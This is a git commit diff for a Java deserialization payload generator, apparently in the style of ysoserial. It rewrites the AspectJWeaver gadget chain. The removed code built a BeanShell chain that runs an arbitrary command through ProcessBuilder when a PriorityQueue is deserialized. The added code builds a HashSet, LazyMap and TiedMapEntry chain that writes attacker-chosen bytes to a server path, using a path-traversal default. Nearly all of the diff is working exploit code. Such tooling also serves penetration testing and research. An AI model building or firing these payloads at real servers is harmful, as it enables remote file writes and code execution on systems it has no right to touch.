c817a242b67532f1b1e89ce168aea3334be20f8e
Whoopsunix <whoopsunix@whoopsunix.com>
2024-03-12 14:20:50 +0800

    add AspectJWeaver :)

--- gadgets/src/main/java/com/ppp/chain/aspectjweaver/AspectJWeaver.java
+++ gadgets/src/main/java/com/ppp/chain/aspectjweaver/AspectJWeaver.java
@@ -1,77 +1,112 @@
 package com.ppp.chain.aspectjweaver;
 
-import bsh.Interpreter;
-import bsh.XThis;
+import com.ppp.JavaClassHelper;
 import com.ppp.ObjectPayload;
+import com.ppp.Printer;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
+import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
+import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
-import com.ppp.utils.Strings;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
 
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
-import java.util.Arrays;
-import java.util.Comparator;
-import java.util.PriorityQueue;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
 
 
 @Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
 @Authors({Authors.JANG})
-@Sink({Sink.Command})
+@Sink({Sink.Default})
 public class AspectJWeaver implements ObjectPayload<Object> {
 
+    private static String folder = ".";
+
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(AspectJWeaver.class, args);
+//        PayloadRunner.run(AspectJWeaver.class, args);
+
+        SinksHelper sinksHelper = new SinksHelper();
+        sinksHelper.setSink(AspectJWeaver.class.getAnnotation(Sink.class).value()[0]);
+        sinksHelper.setEnchant(EnchantType.FileWrite);
+        sinksHelper.setFileContent("123");
+        sinksHelper.setServerFilePath("../../../../../../../../../../../../../../../../../../../../../../../../tmp/AspectJWeaver.txt");
+//        sinksHelper.setServerFilePath("/tmp/AspectJWeaver.txt");
+        JavaClassHelper javaClassHelper = new JavaClassHelper();
+        sinksHelper.setJavaClassHelper(javaClassHelper);
+        PayloadRunner.run(AspectJWeaver.class, args, sinksHelper);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
 //        // sink
-//        Object sinkObject = SinkScheduler.builder(sinksHelper);
+        byte[] contentBytes = (byte[]) SinkScheduler.builder(sinksHelper);
 
-        String command = sinksHelper.getCommand();
+        String serverFilePath = sinksHelper.getServerFilePath();
+        if (!serverFilePath.startsWith("../")) {
+            Printer.warn("AspectJWeaver gadget default path is ./+{path}, please input server file path as ../../../tmp/1.txt");
+        }
+        Printer.warn("This gadget will create cache.idx in server path " + folder);
 
-        Object kickOffObject = getChain(command);
+        Object kickOffObject = getChain(contentBytes, serverFilePath);
 
         return kickOffObject;
     }
 
-    public Object getChain(String command) throws Exception {
+    public Object getChain(byte[] contentBytes, String serverFilePath) throws Exception {
         String s = RanDomUtils.generateRandomString(1);
-        String s1 = RanDomUtils.generateRandomString(3, 6);
 
-        // BeanShell payload
-        String payload = String.format("compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{%s}).start();return new Integer(1);}", Strings.join(
-                Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")),
-                ",", "\"", "\""));
+        Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
 
-        // Create Interpreter
-        Interpreter i = new Interpreter();
+        Object simpleCache = ctor.newInstance(folder, 12);
+        Transformer transformer = new ConstantTransformer(contentBytes);
+        Map lazyMap = LazyMap.decorate((Map) simpleCache, transformer);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, serverFilePath);
 
-        Method method = i.getClass().getDeclaredMethod("setu", String.class, Object.class);
-        method.setAccessible(true);
-        method.invoke(i, "bsh.cwd", s1);
+        HashSet hashset = new HashSet(1);
+        hashset.add(s);
+        Field f = null;
+        try {
+            f = HashSet.class.getDeclaredField("map");
+        } catch (NoSuchFieldException e) {
+            f = HashSet.class.getDeclaredField("backingMap");
+        }
 
-        // Evaluate payload
-        i.eval(payload);
+        Reflections.setAccessible(f);
+        HashMap innimpl = (HashMap) f.get(hashset);
 
-        // Create InvocationHandler
-        XThis xt = new XThis(i.getNameSpace(), i);
-        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
+        Field f2 = null;
+        try {
+            f2 = HashMap.class.getDeclaredField("table");
+        } catch (NoSuchFieldException e) {
+            f2 = HashMap.class.getDeclaredField("elementData");
+        }
 
-        // Create Comparator Proxy
-        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
+        Reflections.setAccessible(f2);
+        Object[] array = (Object[]) f2.get(innimpl);
 
-        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
-        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
-        Object[] queue = new Object[]{s, s};
-        Reflections.setFieldValue(priorityQueue, "queue", queue);
-        Reflections.setFieldValue(priorityQueue, "size", 2);
+        Object node = array[0];
+        if (node == null) {
+            node = array[1];
+        }
 
-        return priorityQueue;
+        Field keyField = null;
+        try {
+            keyField = node.getClass().getDeclaredField("key");
+        } catch (Exception e) {
+            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
+        }
+
+        Reflections.setAccessible(keyField);
+        keyField.set(node, entry);
+
+        return hashset;
     }
 }
